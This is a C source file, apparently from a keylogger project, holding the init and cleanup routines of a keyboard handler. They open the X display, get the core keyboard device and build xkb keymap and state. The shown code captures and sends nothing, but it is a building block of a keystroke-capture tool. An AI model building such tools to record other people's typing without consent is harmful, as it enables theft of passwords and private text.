#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keylogger/keyboard_handler.h"


int KeyboardHandler_init(KeyboardHandler *handler) {
    handler->dpy = NULL;
    handler->keymap = NULL;
    handler->ctx = NULL;
    handler->state = NULL;
    handler->active_window = NULL;

    handler->dpy = XOpenDisplay(NULL);
    if (!handler->dpy) {
        fprintf(stderr, "Failed to open X display\n");
        return 1;
    }

    handler->xcb_conn = XGetXCBConnection(handler->dpy);
    if (!handler->xcb_conn) {
        fprintf(stderr, "Failed to get XCB connection\n");
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->device_id = xkb_x11_get_core_keyboard_device_id(handler->xcb_conn);
    if (handler->device_id == -1) {
        fprintf(stderr, "Failed to get core keyboard device ID\n");
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->ctx = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!handler->ctx) {
        fprintf(stderr, "Failed to create xkb context\n");
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->keymap = xkb_x11_keymap_new_from_device(handler->ctx, handler->xcb_conn, handler->device_id, 0);
    if (!handler->keymap) {
        fprintf(stderr, "Failed to get keymap\n");
        xkb_context_unref(handler->ctx);
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->state = xkb_x11_state_new_from_device(handler->keymap, handler->xcb_conn, handler->device_id);
    if (!handler->state) {
        fprintf(stderr, "Failed to get state\n");
        xkb_keymap_unref(handler->keymap);
        xkb_context_unref(handler->ctx);
        XCloseDisplay(handler->dpy);
        return 1;
    }

    return 0;
}

void KeyboardHandler_cleanup(KeyboardHandler *handler) {
    if (handler->state) {
        xkb_state_unref(handler->state);
    }
    if (handler->keymap) {
        xkb_keymap_unref(handler->keymap);
    }
    if (handler->ctx) {
        xkb_context_unref(handler->ctx);
    }
    if (handler->dpy) {
        XCloseDisplay(handler->dpy);
    }
    if (handler->active_window){
        free(handler->active_window);
    }
}
